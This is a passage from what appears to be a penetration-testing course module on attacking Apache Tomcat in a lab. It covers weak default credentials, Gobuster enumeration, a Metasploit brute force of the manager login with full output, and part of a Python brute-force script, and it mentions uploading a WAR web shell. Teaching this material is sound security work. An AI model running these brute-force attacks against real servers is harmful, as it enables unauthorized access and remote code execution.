              <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://tomcat.apache.org/xml tomcat-users.xsd"</span>
              <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>&gt;</span>
<span class="hljs-comment">&lt;!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the &lt;!.. ..&gt; that surrounds them. You
  will also need to set the passwords to something appropriate.
--&gt;</span>


 <span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>

!-- user manager can access only manager section --&gt;
<span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">"manager-gui"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">"tomcat"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"tomcat"</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">"manager-gui"</span> /&gt;</span>

<span class="hljs-comment">&lt;!-- user admin can access manager and admin section both --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">role</span> <span class="hljs-attr">rolename</span>=<span class="hljs-string">"admin-gui"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">"admin"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"admin"</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">"manager-gui,admin-gui"</span> /&gt;</span>


<span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span>
</code></pre>
<p>The file shows us what each of the roles <code>manager-gui</code>, <code>manager-script</code>, <code>manager-jmx</code>, and <code>manager-status</code> provide access to. In this example, we can see that a user <code>tomcat</code> with the password <code>tomcat</code> has the <code>manager-gui</code> role, and a second weak password <code>admin</code> is set for the user account <code>admin</code></p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>After fingerprinting the Tomcat instance, unless it has a known vulnerability, we&#39;ll typically want to look for the <code>/manager</code> and the <code>/host-manager</code> pages. We can attempt to locate these with a tool such as <code>Gobuster</code> or just browse directly to them.</p>
<p>Tomcat - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://web01.inlanefreight.local:8180/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
</code></pre>
<p>We may be able to either log in to one of these using weak credentials such as <code>tomcat:tomcat</code>, <code>admin:admin</code>, etc. If these first few tries don&#39;t work, we can try a password brute force attack against the login page, covered in the next section. If we are successful in logging in, we can upload a <a href="https://en.wikipedia.org/wiki/WAR\_\(file\_format\">Web Application Resource or Web Application ARchive (WAR)</a>) file containing a JSP web shell and obtain remote code execution on the Tomcat server.</p>
<p>Now that we&#39;ve learned about the structure and function of Tomcat let&#39;s attack it by abusing built-in functionality and exploiting a well-known vulnerability that affected specific versions of Tomcat.</p>
<h2 id="attacking-tomcat">Attacking Tomcat</h2>
<hr>
<p>We&#39;ve identified that there is indeed a Tomcat host exposed externally by our client. As the scope of the assessment is relatively small and all of the other targets are not particularly interesting, let&#39;s turn our full attention to attempting to gain internal access via Tomcat.</p>
<p>As discussed in the previous section, if we can access the <code>/manager</code> or <code>/host-manager</code> endpoints, we can likely achieve remote code execution on the Tomcat server. Let&#39;s start by brute-forcing the Tomcat manager page on the Tomcat instance at <code>http://web01.inlanefreight.local:8180</code>. We can use the <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat\_mgr\_login/">auxiliary/scanner/http/tomcat_mgr_login</a> Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We&#39;ll use Metasploit for our purposes.</p>
<hr>
<h3 id="tomcat-manager-login-brute-force">Tomcat Manager - Login Brute Force</h3>
<p>We first have to set a few options. Again, we must specify the vhost and the target&#39;s IP address to interact with the target properly. We should also set <code>STOP_ON_SUCCESS</code> to <code>true</code> so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">msf6 auxiliary(scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login) &gt; <span class="hljs-built_in">set</span> VHOST web01.inlanefreight.<span class="hljs-built_in">local</span>
msf6 auxiliary(scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login) &gt; <span class="hljs-built_in">set</span> RPORT <span class="hljs-number">8180</span>
msf6 auxiliary(scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login) &gt; <span class="hljs-built_in">set</span> stop_on_success <span class="hljs-literal">true</span>
msf6 auxiliary(scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login) &gt; <span class="hljs-built_in">set</span> rhosts <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.58</span>
</code></pre>
<p>As always, we check to make sure everything is set up correctly by <code>show options</code>.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">msf6 auxiliary(scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login) &gt; show options 

Module options (auxiliary/scanner/<span class="hljs-keyword">http</span>/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   <span class="hljs-comment">----              ---------------                                                                 --------  -----------</span>
   BLANK_PASSWORDS   <span class="hljs-literal">false</span>                                                                           no        Try blank passwords <span class="hljs-keyword">for</span> all users
   BRUTEFORCE_SPEED  <span class="hljs-number">5</span>                                                                               yes       How fast <span class="hljs-built_in">to</span> bruteforce, <span class="hljs-built_in">from</span> <span class="hljs-number">0</span> <span class="hljs-built_in">to</span> <span class="hljs-number">5</span>
   DB_ALL_CREDS      <span class="hljs-literal">false</span>                                                                           no        Try <span class="hljs-keyword">each</span> user/password couple stored <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> current database
   DB_ALL_PASS       <span class="hljs-literal">false</span>                                                                           no        Add all passwords <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> current database <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> list
   DB_ALL_USERS      <span class="hljs-literal">false</span>                                                                           no        Add all users <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> current database <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> list
   PASSWORD                                                                                          no        The HTTP password <span class="hljs-built_in">to</span> specify <span class="hljs-keyword">for</span> authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, <span class="hljs-literal">one</span> per <span class="hljs-built_in">line</span>
   Proxies                                                                                           no        A proxy chain <span class="hljs-keyword">of</span> <span class="hljs-built_in">format</span> type:host:port[,type:host:port][...]
   RHOSTS            <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.58</span>                                                                   yes       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
   RPORT             <span class="hljs-number">8180</span>                                                                            yes       The target port (TCP)
   SSL               <span class="hljs-literal">false</span>                                                                           no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
   STOP_ON_SUCCESS   <span class="hljs-literal">true</span>                                                                            yes       Stop guessing when <span class="hljs-keyword">a</span> credential works <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> host
   TARGETURI         /manager/html                                                                   yes       URI <span class="hljs-keyword">for</span> Manager login. Default is /manager/html
   THREADS           <span class="hljs-number">1</span>                                                                               yes       The <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> concurrent threads (<span class="hljs-built_in">max</span> <span class="hljs-literal">one</span> per host)
   USERNAME                                                                                          no        The HTTP username <span class="hljs-built_in">to</span> specify <span class="hljs-keyword">for</span> authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users <span class="hljs-keyword">and</span> passwords separated <span class="hljs-keyword">by</span> <span class="hljs-literal">space</span>, <span class="hljs-literal">one</span> pair per <span class="hljs-built_in">line</span>
   USER_AS_PASS      <span class="hljs-literal">false</span>                                                                           no        Try <span class="hljs-keyword">the</span> username <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> password <span class="hljs-keyword">for</span> all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, <span class="hljs-literal">one</span> per <span class="hljs-built_in">line</span>
   VERBOSE           <span class="hljs-literal">true</span>                                                                            yes       Whether <span class="hljs-built_in">to</span> print output <span class="hljs-keyword">for</span> all attempts
   VHOST             web01.inlanefreight.<span class="hljs-built_in">local</span>                                                       no        HTTP server virtual host
</code></pre>
<p>We hit <code>run</code> and get a hit for the credential pair <code>tomcat:admin</code>.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">msf6</span> <span class="hljs-selector-tag">auxiliary</span>(scanner/http/tomcat_mgr_login) &gt; <span class="hljs-selector-tag">run</span>

<span class="hljs-selector-attr">[!]</span> <span class="hljs-selector-tag">No</span> <span class="hljs-selector-tag">active</span> <span class="hljs-selector-tag">DB</span> <span class="hljs-selector-tag">--</span> <span class="hljs-selector-tag">Credential</span> <span class="hljs-selector-tag">data</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">saved</span>!
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:admin</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:manager</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:role1</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:root</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:tomcat</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:s3cret</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">admin</span><span class="hljs-selector-pseudo">:vagrant</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:admin</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:manager</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:role1</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:root</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:tomcat</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:s3cret</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">manager</span><span class="hljs-selector-pseudo">:vagrant</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:admin</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:manager</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:role1</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:root</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:tomcat</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:s3cret</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">role1</span><span class="hljs-selector-pseudo">:vagrant</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:admin</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:manager</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:role1</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:root</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:tomcat</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:s3cret</span> (Incorrect)
<span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">LOGIN</span> <span class="hljs-selector-tag">FAILED</span>: <span class="hljs-selector-tag">root</span><span class="hljs-selector-pseudo">:vagrant</span> (Incorrect)
<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.201</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:8180</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Login</span> <span class="hljs-selector-tag">Successful</span>: <span class="hljs-selector-tag">tomcat</span><span class="hljs-selector-pseudo">:admin</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Scanned</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">hosts</span> (<span class="hljs-number">100%</span> complete)
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Auxiliary</span> <span class="hljs-selector-tag">module</span> <span class="hljs-selector-tag">execution</span> <span class="hljs-selector-tag">completed</span>
</code></pre>
<p>It is important to note that there are many tools available to us as penetration testers. Many exist to make our work more efficient, especially since most penetration tests are &quot;time-boxed&quot; or under strict time constraints. No one tool is better than another, and it does not make us a &quot;bad&quot; penetration tester if we use certain tools like Metasploit to our advantage. Provided we understand each scanner and exploit script that we run and the risks, then utilizing this scanner properly is no different from using Burp Intruder or writing a custom Python script. Some say, &quot;work smarter, not harder.&quot; Why would we make extra work for ourselves during a 40-hour assessment with 1,500 in-scope hosts when we can use a particular tool to help us? It is vital for us to understand <code>how</code> our tools work and how to do many things manually. We could manually try each credential pair in the browser or script this using <code>cURL</code> or Python if we choose. At the very least, if we decide to use a certain tool, we should be able to explain its usage and potential impact to our clients should they question us during or after the assessment.</p>
<p>Let&#39;s say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the <code>PROXIES</code> option like the following:</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set PROXIES HTTP:<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8080</span>

PROXIES =&gt; HTTP:<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">8080</span>


msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run

[!] No active <span class="hljs-built_in">DB</span> -- Credential data will <span class="hljs-keyword">not</span> be saved!
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:admin (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:manager (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:role1 (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:root (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:tomcat (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:s3cret (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: admin:vagrant (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:admin (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:manager (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:role1 (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:root (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:tomcat (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:s3cret (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: manager:vagrant (Incorrect)
[-] <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.58</span>:<span class="hljs-number">8180</span> - LOGIN FAILED: role1:admin (Incorrect)
</code></pre>
<p>We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/burp\_tomcat.png" alt="image"></p>
<p>A quick check of the value in the <code>Authorization</code> header for one request shows that the scanner is running correctly, base64 encoding the credentials <code>admin:vagrant</code> the way the Tomcat application would do when a user attempts to log in directly from the web application. Try this out for some examples throughout this module to start getting comfortable with debugging through a proxy.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> YWRtaW46dmFncmFudA== |base64 <span class="hljs-_">-d</span>

admin:vagrant
</code></pre>
<p>We can also use <a href="https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce">this</a> Python script to achieve the same result.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python</span>

<span class="hljs-built_in">import</span> requests
from termcolor <span class="hljs-built_in">import</span> cprint
<span class="hljs-built_in">import</span> argparse

<span class="hljs-attr">parser</span> = argparse.ArgumentParser(<span class="hljs-attr">description</span> = <span class="hljs-string">"Tomcat manager or host-manager credential bruteforcing"</span>)

parser.add_argument(<span class="hljs-string">"-U"</span>, <span class="hljs-string">"--url"</span>, <span class="hljs-attr">type</span> = str, <span class="hljs-attr">required</span> = True, <span class="hljs-attr">help</span> = <span class="hljs-string">"URL to tomcat page"</span>)
parser.add_argument(<span class="hljs-string">"-P"</span>, <span class="hljs-string">"--path"</span>, <span class="hljs-attr">type</span> = str, <span class="hljs-attr">required</span> = True, <span class="hljs-attr">help</span> = <span class="hljs-string">"manager or host-manager URI"</span>)
parser.add_argument(<span class="hljs-string">"-u"</span>, <span class="hljs-string">"--usernames"</span>, <span class="hljs-attr">type</span> = str, <span class="hljs-attr">required</span> = True, <span class="hljs-attr">help</span> = <span class="hljs-string">"Users File"</span>)
